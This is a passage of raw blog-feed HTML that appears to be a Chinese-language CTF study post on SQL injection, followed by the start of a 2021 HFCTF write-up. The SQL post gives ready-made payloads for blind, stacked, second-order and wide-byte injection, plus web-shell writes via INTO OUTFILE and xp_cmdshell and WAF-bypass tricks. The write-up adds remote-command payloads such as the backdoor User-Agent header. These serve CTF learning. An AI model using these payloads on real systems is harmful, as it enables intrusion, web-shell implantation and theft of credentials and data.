class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> Polygon(id))))</span><br></pre></td></tr></table></figure><p>爆字段名</p><p>用union</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> e<span class="number">.4</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a,(<span class="keyword">select</span> <span class="number">2</span>)b,(<span class="keyword">select</span> <span class="number">3</span>)c,(<span class="keyword">select</span> <span class="number">4</span>)d <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test)e limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">3</span>)f,(<span class="keyword">select</span> <span class="number">1</span>)g,(<span class="keyword">select</span> <span class="number">1</span>)h,(<span class="keyword">select</span> <span class="number">1</span>)i;</span><br></pre></td></tr></table></figure><p>不用union</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">as</span> a <span class="keyword">join</span> test <span class="keyword">as</span> b) <span class="keyword">as</span> c);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 第一个字段出来后,使用<span class="keyword">using</span>爆第二个</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">as</span> a <span class="keyword">join</span> test <span class="keyword">as</span> b <span class="keyword">using</span>(id)) <span class="keyword">as</span> c);</span><br></pre></td></tr></table></figure><p>eg：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a  <span class="keyword">join</span> news <span class="keyword">as</span> b) <span class="keyword">as</span> c;</span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name ‘id’</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id)) c;</span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name ‘name’</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,name)) c;</span><br><span class="line"></span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name ‘passwd’</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,name,passwd)) c;</span><br></pre></td></tr></table></figure><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><p>在boolean注入无回显时，使用次方法来判断是否成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">基于sleep的延迟 </span><br><span class="line">xx<span class="string">&#x27; or if(length((select database()))&gt;1,sleep(5),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">笛卡尔乘积运算时间造成的时间延迟</span></span><br><span class="line"><span class="string">xx&#x27;</span> <span class="keyword">or</span> if(length((<span class="keyword">select</span> database()))<span class="operator">&gt;</span><span class="number">1</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A,information_schema.columns p B,information_schema.columns C),<span class="number">1</span>) # </span><br><span class="line"></span><br><span class="line">基于benchmark的延迟 </span><br><span class="line">xx<span class="string">&#x27;or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#x27;</span>a<span class="string">&#x27;))),1) #--大概会用2S时间</span></span><br></pre></td></tr></table></figure><p><strong>一般流程</strong></p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>,<span class="number">1</span>,sleep(<span class="number">3</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line">使用二分法，一步一步爆出数据库名，假设其中有一数据库名为flag</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’flag’ limit <span class="number">1</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)) <span class="operator">%</span><span class="number">23</span></span><br><span class="line">假设有一表名为flagtable</span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>’flagtable’ limit <span class="number">1</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)) <span class="operator">%</span><span class="number">23</span>，</span><br><span class="line">假设爆出列名为name和password</span><br></pre></td></tr></table></figure><p>爆表中的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> group_concat(name,password) <span class="keyword">from</span> flag.flagtable limit <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">48</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)) <span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p><strong>利用handler</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27;;select if(sub(user(),1,1)=&#x27;</span>r<span class="string">&#x27;,sleep(3),1)%23</span></span><br></pre></td></tr></table></figure><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p><p>基本形式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span> </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>其中  HANDLER tbl_name <span class="keyword">OPEN</span> <span class="keyword">AS</span> example</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>其后  HANDLER example READ index_name<span class="operator">=</span>&quot;example2&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png" alt=""></p><p><strong>利用rename</strong></p><p>以强网杯随便注为例</p><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to word1; rename table  `1919810931114514` to words; alert table words </span></span><br><span class="line"><span class="string">add id int unsigned not Null auto_increment primary key ; alert table words change flag data </span></span><br><span class="line"><span class="string">varchar(100); #</span></span><br></pre></td></tr></table></figure><p>具体思路为将需要获得的数据的表、列等名字修改为目前可以查询到的表和列的名字，需要注意的是，在修改需要获得数据的表、列的名字前，需要先将目前可以查询到的表和名字先进行修改，然后在利用页面本来就有的查询功能查询敏感数据。</p><p><strong>利用execute</strong></p><p>同距离19强网杯的随便注</p><p>execute用来执行由SQLPrepare创建的SQL语句。</p><p>将select * from <code>1919810931114514</code>进行16进制编码</p><p>再构造出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure><p>prepare…from…是预处理语句，会进行编码转换。利用这个来让语句进行解码</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>把非法代码写入数据库（利用‘\’进行转义写入），然后在其他地方调用这个数据拼接成为非法代码写入sql语句中</p><p>简单的逻辑如下</p><p>非法代码转义 —存入—&gt;数据库—取出—&gt;后台变量中—拼接—&gt;组成非法语句</p><p>eg：[SWPU2019]Web1</p><p>payload</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#group by获取列数</span></span><br><span class="line"><span class="literal">-1</span><span class="string">&#x27;/**/group/**/by/**/22,&#x27;</span><span class="number">11</span></span><br><span class="line"><span class="comment">#查看版本</span></span><br><span class="line"><span class="literal">-1</span><span class="string">&#x27;/**/union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"><span class="comment">#获取表名</span></span><br><span class="line"><span class="literal">-1</span><span class="string">&#x27;/**/union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum</span></span><br><span class="line"><span class="string">ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</span></span><br><span class="line"><span class="string">,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"><span class="comment">#获取用户名</span></span><br><span class="line"><span class="literal">-1</span><span class="string">&#x27;/**/union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele</span></span><br><span class="line"><span class="string">ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"><span class="comment">#获取密码</span></span><br><span class="line"><span class="literal">-1</span><span class="string">&#x27;/**/union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele</span></span><br><span class="line"><span class="string">ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure><h3 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h3><p>举例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="comment">/*!UNION*/</span> <span class="comment">/*!SELECT*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><p>利用别名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,a.id,b.id,<span class="operator">*</span> <span class="keyword">from</span>(sys_admin <span class="keyword">as</span> a <span class="keyword">inner</span> <span class="keyword">join</span> sys_admin <span class="keyword">as</span> b <span class="keyword">on</span> a.id<span class="operator">=</span>b.id)</span><br></pre></td></tr></table></figure><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>GBK 占用两字节</p><p>ASCII占用一字节</p><p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。</p><p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select &#x27;</span><span class="operator">&lt;</span>?php <span class="variable">@eval</span>($_POST[<span class="number">1</span>]);?<span class="operator">&gt;</span><span class="string">&#x27; into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">404.</span>php<span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure><p>也可使用dumpfile进行写入。</p><p><strong>outfile和dumpfile的区别：</strong></p><p>outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。dumpfile只能执行一行数据。</p><p>数据库写入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;echo &quot;&lt;%eXECutegLobaL rEquEst(0)%&gt;&quot; &gt; &quot;c:www\uploadFiles2019-11404.asp&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="利用查询不存在用户时虚构用户进行注入"><a href="#利用查询不存在用户时虚构用户进行注入" class="headerlink" title="利用查询不存在用户时虚构用户进行注入"></a>利用查询不存在用户时虚构用户进行注入</h3><p>mysql在查询不存在的数据时，会自动构建虚拟数据</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt=""></p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png" alt=""></p><p>可以看到表自动加上了一个用户</p><p>我们可以用这个来进行登录进去admin账户等用途</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="关键字嵌套，大小写绕过"><a href="#关键字嵌套，大小写绕过" class="headerlink" title="关键字嵌套，大小写绕过"></a>关键字嵌套，大小写绕过</h3><p>union=⇒UNiunionoN</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>URL编码 #→%23</p><p>16进制编码 users→0x7573657273</p><p>ASCII编码</p><p>Unicode编码</p><p>双重编码</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>末尾注释：#,%23,-,—+</p><p>/<strong>/注释可以用于代替空格，%0b代替/</strong>/</p><p>内联注释/<em>!要执行的code</em>/例如:id=1/<em>!UnIoN</em>/SeLeCT</p><p>’ 和 “ 注释，用于闭合SQL语句中的引号</p><h3 id="关键字替换"><a href="#关键字替换" class="headerlink" title="关键字替换"></a>关键字替换</h3><ul><li><p>空格替换：/**/，%a0，（）</p></li><li><p>and替换：&amp;&amp;</p></li><li><p>or替换：||</p></li><li><p>=替换：&lt;，&gt;，like , rlike</p></li><li><p>引号替换：用16进制编码</p></li><li><p>逗号绕过</p><p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p><p>limit中可以利用offset来摆脱对逗号的利用</p></li><li><p>比较符号( &gt;、&lt; )绕过（greatest、between and)</p></li><li><p>逻辑符号的替换（and=&amp;&amp; or=|| xor=| not=!）</p></li></ul><h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin() ==&gt; ascii()<br>sleep() ==&gt;benchmark()<br>concat_ws()==&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@@user ==&gt; user()<br>@@datadir ==&gt; datadir()举例：substring()和substr()无法使用时：<br>？id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　<br>或者：<br>substr((select ‘password’),1,1) = 0x70<br>strcmp(left(‘password’,1), 0x69) = 1<br>strcmp(left(‘password’,1), 0x70) = 0<br>strcmp(left(‘password’,1), 0x71) = -1</p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a><strong>特殊符号</strong></h3><p>反引号，select <code>version()</code>，绕过空格和正则加号和点，”+”和”.”代表连接，也可绕过空格和关键字过滤@符号，用于定义变量，一个@代表用户变量，@@代表系统变量</p><h3 id="关键字拆分"><a href="#关键字拆分" class="headerlink" title="关键字拆分"></a>关键字拆分</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;se&#x27;</span><span class="operator">+</span><span class="string">&#x27;lec&#x27;</span><span class="operator">+</span><span class="string">&#x27;t&#x27;</span><span class="operator">%</span>S<span class="operator">%</span>E<span class="operator">%</span>L<span class="operator">%</span>C<span class="operator">%</span>T <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">EXEC</span>(<span class="string">&#x27;ma&#x27;</span><span class="operator">+</span><span class="string">&#x27;ster..x&#x27;</span><span class="operator">+</span><span class="string">&#x27;p_cm&#x27;</span><span class="operator">+</span><span class="string">&#x27;dsh&#x27;</span><span class="operator">+</span><span class="string">&#x27;ell&quot;net user&quot;&#x27;</span>)<span class="operator">!</span>和()：<span class="string">&#x27;or--+2=--!!!&#x27;</span><span class="number">2</span>id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span>(UnI)(<span class="keyword">oN</span>)<span class="operator">+</span>(SeL)(EcT)</span><br></pre></td></tr></table></figure><h3 id="加括号绕过"><a href="#加括号绕过" class="headerlink" title="加括号绕过"></a><strong>加括号绕过</strong></h3><p><strong>小括号</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> (<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users)<span class="operator">%</span><span class="number">23</span><span class="keyword">union</span>(<span class="keyword">select</span>(<span class="number">1</span>),(<span class="number">2</span>),(<span class="number">3</span>)<span class="keyword">from</span>(users))id<span class="operator">=</span>(<span class="number">1</span>)<span class="keyword">or</span>(<span class="number">0x50</span><span class="operator">=</span><span class="number">0x50</span>)id<span class="operator">=</span>(<span class="number">-1</span>)<span class="keyword">union</span>(((((((<span class="keyword">select</span>(<span class="number">1</span>),hex(<span class="number">2</span>),hex(<span class="number">3</span>)<span class="keyword">from</span>(users))))))))</span><br></pre></td></tr></table></figure><p><strong>花括号</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#123;x user&#125;from&#123;x mysql.user&#125;id=-1 union select 1,&#123;x 2&#125;,3</span><br></pre></td></tr></table></figure><h3 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass information_schema"></a>bypass information_schema</h3><p>前提：mysql≥5.7</p><p>url <a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p>用sys替代</p><p>拿表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">获取第一列列名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select*from (select * from users as a join users b)c--+</span></span><br><span class="line"><span class="string">依次的列名</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username))c<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h3><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210529214131.png" alt=""></p><p>如果一个网站只在tomcat服务器处做数据过滤和处理，我们可以利用解析参数的不同，对WAF检测进行绕过。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></figure><h2 id="其他trick"><a href="#其他trick" class="headerlink" title="其他trick"></a>其他trick</h2><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>　　　　　　　　<span class="operator">/</span><span class="operator">/</span>完整语句 <span class="keyword">select</span> username,age <span class="keyword">from</span> userinfo <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#x27; or 1=1#　　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27; or 1=1#&#x27;</span></span><br><span class="line"><span class="string">&#x27;=0#　　　　　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27;=0#</span></span><br></pre></td></tr></table></figure><h3 id="判断三种数据库的语句"><a href="#判断三种数据库的语句" class="headerlink" title="判断三种数据库的语句"></a><strong>判断三种数据库的语句</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL：<span class="keyword">and</span> length(<span class="keyword">user</span>())<span class="operator">&gt;</span><span class="number">10</span></span><br><span class="line">ACCESS：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span> MSysAccessObjects)<span class="operator">&gt;</span><span class="number">0</span></span><br><span class="line">MSSQL：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span> sysobjects)<span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>表名，列名为数字时，要使用<code>`反引号括起来，例如</code>1231818`</p>]]></content>
    
    
    <summary type="html">对于sql注入的总结和归纳，除了基础性的知识以外其他知识点主要以打ctf遇到的进行总结添加归纳，目前仍在更新中</summary>
    
    
    
    <category term="渗透知识" scheme="http://www.fxizenta.design/categories/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86/"/>
    
    <category term="sql注入" scheme="http://www.fxizenta.design/categories/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86/sql%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="sqli" scheme="http://www.fxizenta.design/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>2021hfctf_wp</title>
    <link href="http://www.fxizenta.design/2021/04/06/2021hfctf-wp/"/>
    <id>http://www.fxizenta.design/2021/04/06/2021hfctf-wp/</id>
    <published>2021-04-06T11:52:50.000Z</published>
    <updated>2021-07-23T08:59:52.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021hfctf-wp"><a href="#2021hfctf-wp" class="headerlink" title="2021hfctf wp"></a>2021hfctf wp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>前段时间php git仓库被上传的恶意代码的利用RCE</p><p>去github上看看恶意代码段</p><p>有点小坑的是后面还有一个t</p><p>User-Agentt:zerodiumsystem(“cat /flag”);</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt=""></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><p>代码百度一下发现是fatfree框架</p><p>下源码下来看一下</p><p>发现代码利用段如下</p><p><img src="https://i.loli.net/2021/04/06/UbaAjcunLsKoQyX.png" alt="unsetme"></p><p>构造payload?a=b&amp;a=b%0a,$abc);system(“cat /flag”</p><h2 id="慢慢来数据库"><a href="#慢慢来数据库" class="headerlink" title="慢慢来数据库"></a>慢慢来数据库</h2><p>这题是真的有毒。。</p><p>根据提示</p><p>index.php的md5注入绕过，password填129581926211651571912466741651878684928即可<br>ssrf访问127.0.0.1/admin.php<br>然后堆叠注入，这里应该是强网杯随便注的魔改</p><p>发现2个库，找到库 ctf2 里2个表</p><p>看一下2个表的字段<br>real_admin_here_do_you_find里是id,username,password<br>fake_admin是id,username,fake_password<br>页面默认select的是fake_admin，用改名的方法来查真的密码</p><p>这里用的是RENAME</p><figure class="highlight sql"><table><tr><td 